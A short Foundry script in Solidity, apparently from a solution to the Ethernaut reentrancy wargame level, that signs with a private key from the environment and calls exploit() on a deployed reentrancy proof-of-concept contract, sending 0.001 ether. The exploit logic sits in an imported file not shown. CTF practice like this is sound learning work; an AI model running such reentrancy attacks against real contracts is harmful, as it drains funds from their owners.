pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "Ethernaut/reentrancy_poc.sol";

contract ReentrancyPOCScript is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        ReentrancyPOC reentrancyPOC = ReentrancyPOC(payable(0xc85B4989a71E988962902b7703Cf45e3d375D3a4));
        reentrancyPOC.exploit{value: 0.001 ether}();

        vm.stopBroadcast();
    }
}